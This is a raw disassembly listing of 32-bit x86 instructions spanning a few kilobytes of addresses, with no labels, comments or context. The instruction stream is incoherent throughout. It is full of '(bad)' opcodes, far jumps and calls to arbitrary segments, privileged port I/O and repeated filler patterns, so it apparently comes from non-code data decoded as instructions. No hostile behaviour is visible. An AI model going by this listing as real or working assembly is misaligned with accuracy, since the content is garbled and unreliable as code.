  4162f5:	outs   dx,BYTE PTR ds:[esi]
  4162f6:	xor    ah,BYTE PTR ds:0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x3c41:0x629c7aee
  416305:	jmp    0x0:0x1040000
  41630c:	mov    WORD PTR [ebx],?
  41630e:	ret    0xa59a
  416311:	sbb    DWORD PTR [ebp+0x7f],esp
  416314:	cmp    bl,ah
  416316:	add    eax,0x723f302a
  41631b:	mov    ds:0xe0b1507,al
  416320:	mov    ecx,0x2d831c7d
  416325:	cld    
  416326:	jno    0x416369
  416328:	fmul   DWORD PTR [ecx+edi*2+0x287d57d3]
  41632f:	daa    
  416330:	pop    ebp
  416331:	dec    ecx
  416332:	cmp    DWORD PTR [ecx+0xa],0xffffffe9
  416336:	add    al,BYTE PTR [edx+esi*2+0x1d]
  41633a:	inc    edx
  41633b:	pop    esp
  41633c:	cmp    al,0xd8
  41633e:	mov    cl,0x90
  416340:	xchg   esi,eax
  416341:	mov    al,0x45
  416343:	cld    
  416344:	repnz dec ebx
  416346:	cmp    al,BYTE PTR [ecx+0x3a]
  416349:	data16 or BYTE PTR ds:0x63a47412,0x50
  416351:	test   BYTE PTR [edi],ch
  416353:	sbb    bh,BYTE PTR [ebp+0x47]
  416356:	shl    BYTE PTR [edi+eax*2+0x22],1
  41635a:	dec    ebx
  41635b:	popf   
  41635c:	test   edx,esp
  41635e:	xchg   ebp,eax
  41635f:	mov    esi,0x12afafc1
  416364:	loopne 0x416324
  416366:	loope  0x416311
  416368:	(bad)  
  416369:	cli    
  41636a:	rcl    DWORD PTR gs:[ecx+0x3812404],1
  416371:	(bad)  
  416372:	jbe    0x416377
  416374:	and    al,BYTE PTR [ebx]
  416376:	push   edi
  416377:	call   DWORD PTR [ebp+0xc]
  41637a:	inc    edx
  41637b:	popf   
  41637c:	push   eax
  41637d:	je     0x416308
  41637f:	sar    DWORD PTR [ebp-0x26],0x8f
  416383:	mov    DWORD PTR [esi],ebx
  416385:	mov    BYTE PTR [eax+0x14c98a22],dh
  41638b:	xor    ah,BYTE PTR [ebx+eax*4]
  41638e:	(bad)  [edi+0x24182cee]
  416394:	and    al,dl
  416396:	sub    BYTE PTR gs:[esi+0x29],ah
  41639a:	jno    0x4163da
  41639c:	or     edi,esi
  41639e:	repnz ss push eax
  4163a1:	outs   dx,BYTE PTR ds:[esi]
  4163a2:	or     al,0x72
  4163a4:	pushf  
  4163a5:	jne    0x4163d4
  4163a7:	cmp    dh,al
  4163a9:	sub    BYTE PTR [eax-0x3c],bh
  4163ac:	mov    esp,0xd19ac017
  4163b1:	loop   0x4163c3
  4163b3:	cmp    BYTE PTR [ecx+0x28],ch
  4163b6:	pop    esi
  4163b7:	in     al,dx
  4163b8:	inc    esi
  4163b9:	out    dx,al
  4163ba:	test   BYTE PTR [ebx+0x3492a86e],ch
  4163c0:	add    BYTE PTR [ecx],ch
  4163c2:	xor    eax,0x9b268e01
  4163c7:	gs hlt 
  4163c9:	fcomp  QWORD PTR [eax+0x42]
  4163cc:	out    0xc5,eax
  4163ce:	ds fpatan 
  4163d1:	gs pushf 
  4163d3:	xchg   BYTE PTR ds:0x56ffde28,ah
  4163d9:	je     0x41636b
  4163db:	loop   0x4163c1
  4163dd:	enter  0xaac8,0x59
  4163e1:	retf   0x9bc8
  4163e4:	inc    edi
  4163e5:	sti    
  4163e6:	jo     0x416372
  4163e8:	das    
  4163e9:	call   0x7d95de5
  4163ee:	(bad)  
  4163ef:	std    
  4163f0:	jmp    0x1d68:0x38031115
  4163f7:	or     DWORD PTR ds:0xefdd3b03,edx
  4163fd:	push   esi
  4163fe:	jmp    0xde759330
  416403:	mov    ebx,0x8e520d0e
  416408:	push   0x7c
  41640a:	(bad)  
  41640b:	int    0xd2
  41640d:	sti    
  41640e:	retf   0xf9
	...
  416471:	add    BYTE PTR [eax],al
  416473:	add    bl,dh
  416475:	inc    ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	xor    edx,DWORD PTR [esi-0x14bffcdd]
  416486:	add    BYTE PTR [eax],al
  416488:	add    al,0x1
  41648a:	add    BYTE PTR [eax],al
  41648c:	mov    ds:0xa0346d3b,al
  416491:	js     0x416429
  416493:	int3   
  416494:	dec    esi
  416495:	dec    ebp
  416496:	or     ecx,eax
  416498:	xchg   esp,eax
  416499:	out    0xdd,eax
  41649b:	lods   eax,DWORD PTR ds:[esi]
  41649c:	pop    ecx
  41649d:	ror    BYTE PTR [ebx+eax*4+0x28],0x31
  4164a2:	and    BYTE PTR [eax+eiz*1],dl
  4164a5:	and    DWORD PTR [ecx+0x593c32a7],esi
  4164ab:	iret   
  4164ac:	add    bh,bl
  4164ae:	pop    edx
  4164af:	fwait
  4164b0:	xchg   di,ax
  4164b2:	pushf  
  4164b3:	fisubr WORD PTR ds:[esi]
  4164b6:	and    al,0x43
  4164b8:	pop    ebp
  4164b9:	repz retf 
  4164bb:	add    eax,0xf1ea4949
  4164c0:	push   ecx
  4164c1:	shr    BYTE PTR [edx-0xa],cl
  4164c4:	jae    0x4164b4
  4164c6:	mov    ah,0x76
  4164c8:	jmp    0xfb4f:0xd2beb03
  4164cf:	fidiv  WORD PTR [ebx]
  4164d1:	xor    ch,ah
  4164d3:	inc    esi
  4164d4:	sbb    esp,eax
  4164d6:	xor    ch,bh
  4164d8:	fistp  WORD PTR [edi]
  4164da:	dec    ecx
  4164db:	xor    ebx,DWORD PTR [esi]
  4164dd:	dec    esp
  4164de:	pop    ebx
  4164df:	add    BYTE PTR [edx-0x66d131c9],dh
  4164e5:	sahf   
  4164e6:	inc    ebx
  4164e7:	je     0x4164b8
  4164e9:	in     eax,dx
  4164ea:	xchg   edi,eax
  4164eb:	xchg   ebx,eax
  4164ec:	dec    eax
  4164ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164ee:	pop    eax
  4164ef:	inc    ebp
  4164f0:	outs   dx,DWORD PTR ds:[esi]
  4164f1:	sub    eax,0x73119b1
  4164f6:	lea    eax,[edi+ebp*4-0x38]
  4164fa:	or     eax,0x9e5a4952
  4164ff:	mov    dl,0xb7
  416501:	in     eax,0xa9
  416503:	test   BYTE PTR [ebp-0x71],ah
  416506:	ds aaa 
  416508:	push   0x18
  41650a:	dec    ebp
  41650b:	inc    ebx
  41650c:	leave  
  41650d:	imul   esp,esi,0xfffffff9
  416510:	dec    esi
  416511:	inc    esp
  416512:	sbb    al,0x16
  416514:	mov    ecx,0x6f9ea09b
  416519:	rol    DWORD PTR [ebx-0x4cec1ec6],1
  41651f:	loope  0x41652d
  416521:	mov    ds:0x3ae48d47,al
  416526:	cwde   
  416527:	bound  ecx,QWORD PTR [ebx+0x52afd09d]
  41652d:	mov    ss,WORD PTR [ebp-0xf]
  416530:	mov    bh,0x7f
  416532:	and    BYTE PTR [edi],cl
  416534:	and    al,0xfc
  416536:	mov    DWORD PTR [ebx+0x57],0x1f35f81
  41653d:	(bad)  
  41653e:	mov    dh,0x92
  416540:	mov    cl,0x45
  416542:	sbb    eax,0x3e5788e8
  416547:	sub    dl,BYTE PTR [edi]
  416549:	daa    
  41654a:	rol    DWORD PTR [ebx+0x13],1
  41654d:	out    dx,al
  41654e:	cli    
  41654f:	jo     0x416548
  416551:	pop    ebx
  416552:	xchg   esi,eax
  416553:	aaa    
  416554:	mov    WORD PTR [ebx],ss
  416556:	adc    dh,BYTE PTR [eax+0x4567758f]
  41655c:	pop    ds
  41655d:	test   BYTE PTR [edx+0x7f],0x4e
  416561:	lea    esp,[edx+0x57]
  416564:	jne    0x4164f1
  416566:	xor    al,0x61
  416568:	int    0x36
  41656a:	push   ss
  41656b:	or     DWORD PTR [edi],ebp
  41656d:	add    al,0xdf
  41656f:	scas   al,BYTE PTR es:[edi]
  416570:	pop    ds
  416571:	sub    BYTE PTR [esi+0x72],bl
  416574:	mov    ebp,0x888c7461
  416579:	cwde   
  41657a:	push   0xd8366771
  41657f:	lahf   
  416580:	pop    edi
  416581:	ins    BYTE PTR es:[edi],dx
  416582:	mov    ebp,0xc9562b2
  416587:	and    eax,0x706bb23d
  41658c:	pop    edx
  41658d:	das    
  41658e:	mov    ecx,0x7c
	...
  4165f3:	add    BYTE PTR ds:0xfff32bd8,ah
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi-0x5db04354]
  416601:	ret    
  416602:	cmp    al,cl
  416604:	inc    esp
  416605:	in     al,dx
  416606:	add    BYTE PTR [eax],al
  416608:	add    al,0x1
  41660a:	add    BYTE PTR [eax],al
  41660c:	push   ebx
  41660d:	hlt    
  41660e:	mov    al,0xc6
  416610:	bound  edx,QWORD PTR [edx]
  416612:	or     esp,ebp
  416614:	cmc    
  416615:	call   0xe69d:0xcf1daf9e
  41661c:	out    dx,al
  41661d:	and    al,0xf7
  41661f:	adc    DWORD PTR [ebp-0x92db8e4],edx
  416625:	(bad)  
  416627:	pop    edx
  416628:	inc    edi
  416629:	stos   BYTE PTR es:[edi],al
  41662a:	cdq    
  41662b:	ficomp DWORD PTR [ebx+esi*4]
  41662e:	in     al,0x29
  416630:	ror    BYTE PTR [edi-0x3bd2d166],cl
  416636:	int3   
  416637:	add    eax,0x5f7c9472
  41663c:	jg     0x4165c2
  41663e:	leave  
  41663f:	fdiv   DWORD PTR [ebx+0x49f9ed6d]
  416645:	dec    ebx
  416646:	xor    edi,DWORD PTR [edx+ebx*8+0x5e]
  41664a:	int3   
  41664b:	ficom  DWORD PTR [eax+ebp*8-0x65]
  41664f:	jb     0x416635
  416651:	and    DWORD PTR [ebx+0x733e05b5],esi
  416657:	and    BYTE PTR [ecx+ecx*1],bl
  41665a:	cmp    BYTE PTR [ebp-0x4a],al
  41665d:	or     ebx,ebp
  41665f:	fwait
  416660:	cmp    DWORD PTR ds:0xbcbbace4,edi
  416666:	jg     0x416670
  416668:	aad    0x51
  41666a:	aam    0x1a
  41666c:	js     0x416614
  41666e:	clc    
  41666f:	jmp    0x4166bd
  416671:	add    al,0xca
  416673:	out    0xd2,eax
  416675:	(bad)  
  416676:	mov    dh,0x2e
  416678:	fisttp DWORD PTR [ecx+0x6a1cd736]
  41667e:	dec    ecx
  41667f:	loope  0x416688
  416681:	inc    esi
  416682:	gs mov ebx,0xe36fae83
  416688:	pop    edx
  416689:	mov    ds:0x1c5083eb,al
  41668e:	mov    eax,ds:0x5c2b69fd
  416693:	enter  0xffa3,0x27
  416697:	dec    edi
  416698:	xchg   DWORD PTR [eax+0x2eb418e3],eax
  41669e:	sub    DWORD PTR [edi+0x3d],esi
  4166a1:	xchg   ecx,eax
  4166a2:	or     eax,0x48bb7546
  4166a7:	and    bl,dl
  4166a9:	xchg   ch,ah
  4166ab:	lods   eax,DWORD PTR ds:[esi]
  4166ac:	cdq    
  4166ad:	xor    cl,BYTE PTR [ebp+0x9]
  4166b0:	gs retf 0xf674
  4166b4:	jo     0x4166c5
  4166b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166b7:	or     BYTE PTR [eax-0x6f685c7c],ah
  4166bd:	add    al,0xf7
  4166bf:	es pop ds
  4166c1:	sub    eax,0x851bccc4
  4166c6:	lds    ebx,FWORD PTR [eax+0x0]
  4166c9:	and    ch,dh
  4166cb:	jbe    0x4166b5
  4166cd:	pusha  
  4166ce:	jmp    0xec40:0xb921aa85
  4166d5:	js     0x41674c
  4166d7:	test   eax,0xc4bb5943
  4166dc:	pop    ebx
  4166dd:	repnz adc DWORD PTR [ecx-0x7a],0xdcbc4868
  4166e5:	xchg   BYTE PTR [edx-0x4e105df8],bl
  4166eb:	mov    eax,0x141eae46
  4166f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166f1:	retf   0xa1ff
  4166f4:	div    DWORD PTR [esi+0x75]
  4166f7:	loope  0x4166fe
  4166f9:	outs   dx,DWORD PTR ds:[esi]
  4166fa:	out    dx,eax
  4166fb:	cwde   
  4166fc:	out    0xa7,al
  4166fe:	pop    ebx
  4166ff:	dec    ebx
  416700:	stos   BYTE PTR es:[edi],al
  416701:	xchg   BYTE PTR [ebx+0x5fada27a],bh
  416707:	nop
  416708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416709:	fisttp WORD PTR [edi-0x3fa46b63]
  41670f:	sub    al,BYTE PTR [eax]
	...
  416771:	add    BYTE PTR [eax],al
  416773:	add    ah,al
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	fild   QWORD PTR [edi+0x34]
  416783:	out    0x48,al
  416785:	in     eax,dx
  416786:	add    BYTE PTR [eax],al
  416788:	add    al,0x1
  41678a:	add    BYTE PTR [eax],al
  41678c:	sti    
  41678d:	inc    esi
  41678e:	test   eax,0xee1e7059
  416793:	outs   dx,BYTE PTR ds:[esi]
  416794:	and    edi,DWORD PTR [ebx+0x2493bb4f]
  41679a:	push   ecx
  41679b:	mov    dh,dh
  41679d:	mov    eax,0x52cad165
  4167a2:	retf   0xd400
  4167a5:	dec    ebp
  4167a6:	add    eax,0x81d1b612
  4167ab:	test   al,0x1b
  4167ad:	sbb    DWORD PTR [edi-0x2e4c5b29],0xe
  4167b4:	pop    es
  4167b5:	jecxz  0x4167c4
  4167b7:	lods   al,BYTE PTR ds:[esi]
  4167b8:	jecxz  0x416763
  4167ba:	xor    BYTE PTR [ebx+eiz*4],dh
  4167bd:	clc    
  4167be:	xor    edi,DWORD PTR [edx]
  4167c0:	aaa    
  4167c1:	stos   BYTE PTR es:[edi],al
  4167c2:	pop    edi
  4167c3:	cld    
  4167c4:	inc    eax
  4167c5:	icebp  
  4167c6:	jae    0x4167fc
  4167c8:	int3   
  4167c9:	out    0x26,eax
  4167cb:	pop    ebp
  4167cc:	lock xchg edi,eax
  4167ce:	pop    ebx
  4167cf:	cmc    
  4167d0:	into   
  4167d1:	cmp    eax,0xa3ffd501
  4167d6:	cmp    eax,0x4f5b626a
  4167db:	into   
  4167dc:	xor    ebx,DWORD PTR ds:0x6c0e9664
  4167e2:	push   0x6195431d
  4167e7:	push   edi
  4167e8:	shl    BYTE PTR [edi-0x2e],0x78
  4167ec:	cmp    ebp,DWORD PTR [ecx-0x2c8057cb]
  4167f2:	xchg   edi,eax
  4167f3:	mov    ah,0xe4
  4167f5:	adc    dh,BYTE PTR [ebx+eax*1]
  4167f8:	retf   0x3e7d
  4167fb:	ds push eax
  4167fd:	mov    WORD PTR [eax-0x2a377166],ds
  416803:	and    ch,0x82
  416806:	mov    dl,0xd2
  416808:	cmp    esi,eax
  41680a:	sub    edx,ebx
  41680c:	ins    DWORD PTR es:[edi],dx
  41680d:	xchg   dh,bl
  41680f:	scas   al,BYTE PTR es:[edi]
  416810:	push   edx
  416811:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416812:	mov    ah,0xc2
  416814:	div    DWORD PTR [ebx]
  416816:	push   ebx
  416817:	pop    eax
  416818:	and    al,0x9d
  41681a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41681b:	adc    eax,0xb6f7b552
  416820:	jnp    0x4167af
  416822:	fidivr DWORD PTR [ebp+0x7]
  416825:	mov    ecx,0xe4ef1987
  41682a:	inc    edi
  41682b:	lahf   
  41682c:	enter  0x7078,0xa5
  416830:	enter  0xe84b,0x32
  416834:	push   eax
  416835:	retf   0xa78e
  416838:	push   esi
  416839:	dec    edx
  41683a:	xor    al,0x3e
  41683c:	push   esp
  41683d:	inc    ecx
  41683e:	xchg   ecx,eax
  41683f:	js     0x416892
  416841:	mov    WORD PTR [ecx],?
  416843:	xor    al,bl
  416845:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416846:	adc    DWORD PTR [edx],edi
  416848:	dec    esi
  416849:	sbb    al,BYTE PTR [esi]
  41684b:	outs   dx,BYTE PTR ds:[esi]
  41684c:	in     eax,0x17
  41684e:	sub    al,bl
  416850:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416851:	dec    ecx
  416852:	push   edx
  416853:	ss jmp 0xccdfd2e0
  416859:	sub    dh,BYTE PTR [eax-0x22e4a1ce]
  41685f:	test   eax,0xc9d0ac90
  416864:	(bad)  
  416865:	jmp    0x27d6:0x7260fa9f
  41686c:	pop    ss
  41686d:	retf   0xd03
  416870:	push   DWORD PTR ds:0x5089a272
  416876:	shl    BYTE PTR [ebx-0x22],0x28
  41687a:	push   ebp
  41687b:	gs add ch,ch
  41687e:	xchg   ebp,eax
  41687f:	ins    BYTE PTR es:[edi],dx
  416880:	addr16 enter 0xfa7,0x1a
  416885:	mov    ch,0x70
  416887:	jo     0x416830
  416889:	imul   ecx,DWORD PTR [eax+0x75b049fe],0x7
	...
  4168f3:	add    cl,dl
  4168f5:	scas   eax,DWORD PTR es:[edi]
  4168f6:	push   es
  4168f7:	repz jle 0x4168f5
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0x640e8bbe
  416904:	dec    esp
  416905:	out    dx,al
  416906:	add    BYTE PTR [eax],al
  416908:	add    al,0x1
  41690a:	add    BYTE PTR [eax],al
  41690c:	arpl   WORD PTR [eax-0x2008f4c0],si
  416912:	adc    eax,0x3a6c31a7
  416917:	sub    BYTE PTR [edx],0xaf
  41691a:	and    ecx,DWORD PTR [ecx+0x45608ea2]
  416920:	mov    ch,0xdc
  416922:	mov    esp,DWORD PTR [ebx]
  416924:	mov    edx,0xd1686867
  416929:	call   0xaa8b:0x332a61ad
  416930:	xor    ch,BYTE PTR ds:0xae64fa06
  416936:	xchg   edx,eax
  416937:	mov    al,0x3d
  416939:	int3   
  41693a:	daa    
  41693b:	dec    edx
  41693c:	(bad)  
  41693d:	imul   ebx,DWORD PTR [ebx],0x27cd0335
  416943:	jne    0x4169bc
  416945:	push   esi
  416946:	test   ecx,0x37faf518
  41694c:	das    
  41694d:	adc    DWORD PTR [edx-0x3d303e14],edx
  416953:	sbb    bh,BYTE PTR [ebx]
  416955:	pop    esp
  416956:	mov    esp,0xd0624c6c
  41695b:	ret    0xf840
  41695e:	add    ah,BYTE PTR [ecx]
  416960:	add    ebp,DWORD PTR [edi-0x4611c82]
  416966:	std    
  416967:	nop
  416968:	or     eax,esp
  41696a:	sbb    BYTE PTR [ebx-0x6b],dl
  41696d:	push   ebp
  41696e:	xor    eax,0x71246314
  416973:	or     eax,0x415592b8
  416978:	mov    eax,0xd832f7a8
  41697d:	into   
  41697e:	in     al,0x8f
  416980:	add    al,0xf9
  416982:	out    dx,al
  416983:	xchg   DWORD PTR [esi+0x3bd11af3],ebp
  416989:	cmp    al,0x47
  41698b:	sub    al,0xa9
  41698d:	sar    BYTE PTR [eax+0x4],0xea
  416991:	xor    DWORD PTR [edx+edi*1+0x21605eb5],edi
  416998:	xor    eax,0x5aa979c2
  41699d:	int3   
  41699e:	fnstsw WORD PTR [edx]
  4169a0:	pop    esp
  4169a1:	imul   esi,eax,0x2d
  4169a4:	call   0x3ec:0x33e692b0
  4169ab:	test   eax,0xa3a99980
  4169b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169b1:	cwde   
  4169b2:	lea    dx,[ebx+ecx*8]
  4169b6:	xchg   esi,eax
  4169b7:	mov    ds:0x1f715fa1,eax
  4169bc:	adc    ebx,DWORD PTR [esi]
  4169be:	call   0x21805c57
  4169c3:	sub    al,dh
  4169c5:	mov    ebp,0x6b3c9a13
  4169ca:	mov    ebp,0xe041fc9e
  4169cf:	mov    dh,0xfd
  4169d1:	push   eax
  4169d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169d3:	test   bl,0xe5
  4169d6:	inc    ebx
  4169d7:	or     ebp,DWORD PTR [esi+ebp*1+0x21]
  4169db:	pusha  
  4169dc:	sub    al,0xcc
  4169de:	jbe    0x4169b9
  4169e0:	(bad)  
  4169e1:	cmp    DWORD PTR [edx+0xb],edx
  4169e4:	cwde   
  4169e5:	idiv   BYTE PTR [edx+0x7fbcd26]
  4169eb:	sub    edi,esp
  4169ed:	xchg   ebx,eax
  4169ee:	push   ebx
  4169ef:	idiv   dh
  4169f1:	loop   0x416a02
  4169f3:	jl     0x4169f0
  4169f5:	xor    al,0x7a
  4169f7:	mov    al,ds:0x9e6ddc1c
  4169fc:	inc    ebp
  4169fd:	loope  0x4169c2
  4169ff:	and    BYTE PTR [edx-0x67],dh
  416a02:	div    BYTE PTR ds:0xe396a20e
  416a08:	ins    DWORD PTR es:[edi],dx
  416a09:	xor    DWORD PTR [eax+0x48a03ef4],0x40
	...
  416a73:	add    bl,cl
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0x19de0ba3
  416a82:	sti    
  416a83:	jno    0x416ad5
  416a85:	out    dx,eax
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    al,0x1
  416a8a:	add    BYTE PTR [eax],al
  416a8c:	sbb    DWORD PTR [edi+0xe141a5f],edi
  416a92:	repnz (bad) 
  416a94:	imul   ebx,DWORD PTR [eax+edx*2],0x48
  416a98:	popf   
  416a99:	or     DWORD PTR [eax+0x5d],esp
  416a9c:	push   0xffffff98
  416a9e:	inc    edx
  416a9f:	call   0xc6e0a78a
  416aa4:	push   edx
  416aa5:	add    bh,BYTE PTR [ebp+0x1c4ba6e5]
  416aab:	jl     0x416b26
  416aad:	xlat   BYTE PTR ds:[ebx]
  416aae:	sub    BYTE PTR [ebp+0x59],0x23
  416ab2:	call   0xa383500e
  416ab7:	push   esp
  416ab8:	ffree  st(7)
  416aba:	or     cl,BYTE PTR [ebp+0x55]
  416abd:	test   DWORD PTR [edx],edi
  416abf:	sbb    ah,bl
  416ac1:	loope  0x416a46
  416ac3:	mov    ds:0x5dc84187,al
  416ac8:	repnz hlt 
  416aca:	mov    bl,0xd7
  416acc:	das    
  416acd:	add    DWORD PTR [edi-0x2f61005d],ebx
  416ad3:	dec    eax
  416ad4:	stc    
  416ad5:	das    
  416ad6:	cmp    ah,dl
  416ad8:	push   0x21
  416ada:	or     BYTE PTR [esi+edi*8],dl
  416add:	sbb    ebx,DWORD PTR [edi+0x56]
  416ae0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ae1:	inc    ecx
  416ae2:	out    dx,al
  416ae3:	or     ch,al
  416ae5:	jnp    0x416adf
  416ae7:	arpl   WORD PTR [esi-0xe],sp
  416aea:	mov    esp,0x985f1aad
  416aef:	leave  
  416af0:	retf   0x524f
  416af3:	arpl   WORD PTR [ebx],di
  416af5:	dec    ebx
  416af6:	pop    ds
  416af7:	stos   BYTE PTR es:[edi],al
  416af8:	push   esp
  416af9:	call   0x787dde90
  416afe:	hlt    
  416aff:	ror    BYTE PTR [eax+ebp*1],0x2d
  416b03:	call   0xd6e99ca
  416b08:	sub    bl,BYTE PTR [esi+0x6ea12d2e]
  416b0e:	xor    al,0xad
  416b10:	dec    ebp
  416b11:	inc    esp
  416b12:	adc    esp,DWORD PTR [eax+eax*4-0x64]
  416b16:	dec    eax
  416b17:	inc    eax
  416b18:	int    0x27
  416b1a:	sub    ch,BYTE PTR [edx]
  416b1c:	(bad)  
  416b1d:	jmp    0x416ad5
  416b1f:	adc    al,0x9e
  416b21:	out    dx,eax
  416b22:	adc    eax,0xff648dc0
  416b27:	pop    ss
  416b28:	popa   
  416b29:	call   0xbc000a78
  416b2e:	push   edi
  416b2f:	dec    edx
  416b30:	int    0xdc
  416b32:	loop   0x416b7d
  416b34:	cmp    cl,ch
  416b36:	fldenv [ecx]
  416b38:	push   esi
  416b39:	push   cs
  416b3a:	and    ebx,DWORD PTR [ebx]
  416b3c:	or     DWORD PTR [ebp-0xbd2462e],edi
  416b42:	neg    DWORD PTR [eax+0x57]
  416b45:	mov    ebp,0x2866f738
  416b4a:	cdq    
  416b4b:	jae    0x416b5d
  416b4d:	add    BYTE PTR [ebp+0x29],0x38
  416b51:	mov    esp,0xee2b810
  416b56:	push   ebx
  416b57:	loope  0x416b5f
  416b59:	jmp    0xce9e:0x6a10cb5e
  416b60:	call   0xb04d:0x3937e0a4
  416b67:	stos   DWORD PTR es:[edi],eax
  416b68:	mov    bh,0x14
  416b6a:	sti    
  416b6b:	retf   0xbc33
  416b6e:	or     BYTE PTR [edx+0x1eb3d78c],dh
  416b74:	popf   
  416b75:	push   ss
  416b76:	jmp    0x416b0d
  416b78:	sahf   
  416b79:	stos   DWORD PTR es:[edi],eax
  416b7a:	je     0x416b3e
  416b7c:	test   eax,0x415388db
  416b81:	pop    ebp
  416b82:	jae    0x416bc5
  416b84:	scas   eax,DWORD PTR es:[edi]
  416b85:	stc    
  416b86:	adc    al,0x31
  416b88:	ret    0x371c
  416b8b:	fcomp  QWORD PTR [ebp-0x54]
  416b8e:	scas   eax,DWORD PTR es:[edi]
  416b8f:	sbb    al,BYTE PTR [eax]
	...
  416bf1:	add    BYTE PTR [eax],al
  416bf3:	add    bl,ah
  416bf5:	gs push cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x4b5b70a9
  416c01:	ins    BYTE PTR es:[edi],dx
  416c02:	repz fist WORD PTR [eax+esi*8+0x0]
  416c07:	add    BYTE PTR [ecx+eax*1],al
  416c0a:	add    BYTE PTR [eax],al
  416c0c:	push   esi
  416c0d:	fld    QWORD PTR [eax+0xf]
  416c10:	mov    ebx,0x93d2ecf5
  416c15:	cdq    
  416c16:	dec    ebp
  416c17:	rcl    bl,1
  416c19:	dec    esi
  416c1a:	btr    DWORD PTR [eax+0x293929c1],esi
  416c21:	dec    edx
  416c22:	dec    esp
  416c23:	mov    ds:0x325501cb,al
  416c28:	js     0x416be8
  416c2a:	sar    dh,cl
  416c2c:	and    ebp,DWORD PTR [ebx+0x9]
  416c2f:	add    dh,dh
  416c31:	or     DWORD PTR [edi-0x21],0xd3a4f907
  416c38:	or     BYTE PTR [edx-0x29],dl
  416c3b:	ja     0x416c9b
  416c3d:	jmp    0x5c86:0xf531ffb5
  416c44:	rcr    ah,1
  416c46:	or     eax,DWORD PTR [edx]
  416c48:	and    al,0x30
  416c4a:	add    BYTE PTR [ebx+ebp*2-0x14a6b0a4],dl
  416c51:	jmp    0x8df3cd16
  416c56:	jns    0x416c0e
  416c58:	add    esp,DWORD PTR [eax]
  416c5a:	dec    eax
  416c5b:	xchg   esi,eax
  416c5c:	popa   
  416c5d:	ss out dx,al
  416c5f:	mov    ebx,0x9d6dd2cf
  416c64:	lahf   
  416c65:	pop    DWORD PTR [ebx+0x794d4354]
  416c6b:	or     esp,eax
  416c6d:	pushf  
  416c6e:	ret    0x5336
  416c71:	cs jmp 0x416c9b
  416c74:	(bad)  
  416c75:	das    
  416c76:	call   0xdbab:0x68974339
  416c7d:	popf   
  416c7e:	push   esi
  416c7f:	ret    0x543d
  416c82:	cmp    dl,dl
  416c84:	dec    eax
  416c85:	popa   
  416c86:	push   ecx
  416c87:	lea    ebp,[edx]
  416c89:	fnstcw WORD PTR [eax-0x3ad1bc3a]
  416c8f:	or     DWORD PTR [ecx-0x67],esp
  416c92:	jne    0x416c1f
  416c94:	fs or  al,0xc5
  416c97:	sahf   
  416c98:	enter  0xde62,0x7e
  416c9c:	iret   
  416c9d:	in     al,dx
  416c9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c9f:	xor    al,0x48
  416ca1:	push   cs
  416ca2:	dec    esi
  416ca3:	pop    edx
  416ca4:	jl     0x416d14
  416ca6:	xchg   DWORD PTR [ecx-0x28393878],esp
  416cac:	xor    esi,ebx
  416cae:	dec    ebp
  416caf:	or     ebp,DWORD PTR [ebp+edi*2-0x69]
  416cb3:	rsqrtps xmm1,XMMWORD PTR [esi]
  416cb6:	out    0x2,al
  416cb8:	and    bh,bh
  416cba:	mov    edi,0x76f04140
  416cbf:	and    al,0x36
  416cc1:	out    0x8f,al
  416cc3:	xor    eax,0x4eb1c5d9
  416cc8:	fdiv   QWORD PTR [ebp+edi*2-0x3f]
  416ccc:	mov    ebp,0x42e288e4
  416cd1:	popf   
  416cd2:	lods   eax,DWORD PTR ds:[esi]
  416cd3:	mov    ch,0x49
  416cd5:	cld    
  416cd6:	or     al,0x1e
  416cd8:	inc    esp
  416cd9:	push   ebp
  416cda:	aam    0x21
  416cdc:	pop    es
  416cdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cde:	mov    eax,0x2f92da05
  416ce3:	cmp    al,0xa5
  416ce5:	in     eax,dx
  416ce6:	and    dl,BYTE PTR [ebx-0x6ab4c5a9]
  416cec:	(bad)  
  416ced:	jne    0x416d03
  416cef:	or     al,0x9
  416cf2:	and    DWORD PTR [ebx+ecx*4-0x3ab0770c],edi
  416cf9:	push   ebx
  416cfa:	or     BYTE PTR [ecx-0x73],dh
  416cfd:	hlt    
  416cfe:	cmc    
  416cff:	add    eax,0xf1251e58
  416d04:	jp     0x416cea
  416d06:	xchg   ecx,eax
  416d07:	(bad)  
  416d08:	xor    DWORD PTR [ecx+0x770db412],edi
  416d0e:	dec    esi
  416d0f:	cmp    BYTE PTR [eax],al
	...
  416d71:	add    BYTE PTR [eax],al
  416d73:	add    BYTE PTR [ecx],ah
  416d75:	xchg   ebx,eax
  416d76:	mov    DWORD PTR [edi-0x60d84045],ebp
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	stos   DWORD PTR es:[edi],eax
  416d81:	dec    edi
  416d82:	retf   0x5899
  416d85:	icebp  
  416d86:	add    BYTE PTR [eax],al
